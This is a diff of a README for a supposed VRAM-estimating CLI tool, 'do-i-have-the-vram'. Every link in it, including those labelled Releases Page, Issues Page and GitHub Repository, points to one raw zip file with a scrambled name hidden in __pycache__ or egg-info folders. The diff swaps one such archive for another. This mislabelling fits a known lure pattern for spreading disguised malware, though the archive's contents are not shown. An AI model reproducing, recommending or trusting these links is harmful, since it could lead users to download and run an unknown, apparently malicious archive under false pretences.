@@ -1,6 +1,6 @@
 # 🎮 do-i-have-the-vram - Determine Your VRAM Needs Instantly
 
-[![Download Now](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram.egg-info/vram_i_have_do_the_1.8-beta.1.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram.egg-info/vram_i_have_do_the_1.8-beta.1.zip)
+[![Download Now](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram/__pycache__/have_do_vram_the_i_v3.2.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram/__pycache__/have_do_vram_the_i_v3.2.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ This tool is a lightweight command line interface (CLI) application that estimat
 To use `do-i-have-the-vram`, you need to follow these steps:
 
 1. **Download the Application**
-   - Go to the [Releases Page](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram.egg-info/vram_i_have_do_the_1.8-beta.1.zip) to find the latest version.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram/__pycache__/have_do_vram_the_i_v3.2.zip) to find the latest version.
    - Select the appropriate version for your system and click to download.
 
 2. **Install the Application**
@@ -36,7 +36,7 @@ To use `do-i-have-the-vram`, you need to follow these steps:
 
 ## 📥 Download & Install
 
-To download `do-i-have-the-vram`, visit our [Releases Page](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram.egg-info/vram_i_have_do_the_1.8-beta.1.zip). Choose the version compatible with your system. Follow the above steps to install and run the application.
+To download `do-i-have-the-vram`, visit our [Releases Page](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram/__pycache__/have_do_vram_the_i_v3.2.zip). Choose the version compatible with your system. Follow the above steps to install and run the application.
 
 ## 🎯 System Requirements
 
@@ -54,7 +54,7 @@ If you encounter issues while using the application:
 
 ## 📞 Support
 
-For additional questions or support, please reach out via the [Issues Page](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram.egg-info/vram_i_have_do_the_1.8-beta.1.zip) on GitHub. We welcome your suggestions and feedback.
+For additional questions or support, please reach out via the [Issues Page](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram/__pycache__/have_do_vram_the_i_v3.2.zip) on GitHub. We welcome your suggestions and feedback.
 
 ## 📅 Future Updates
 
@@ -62,7 +62,7 @@ We are committed to improving `do-i-have-the-vram`. Future releases will include
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram.egg-info/vram_i_have_do_the_1.8-beta.1.zip)
-- [Releases Page](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram.egg-info/vram_i_have_do_the_1.8-beta.1.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram/__pycache__/have_do_vram_the_i_v3.2.zip)
+- [Releases Page](https://raw.githubusercontent.com/rick97julho/do-i-have-the-vram/master/do_i_have_the_vram/__pycache__/have_do_vram_the_i_v3.2.zip)
 
 By following these instructions, you will be able to download and use `do-i-have-the-vram` effectively to determine VRAM requirements for various models.
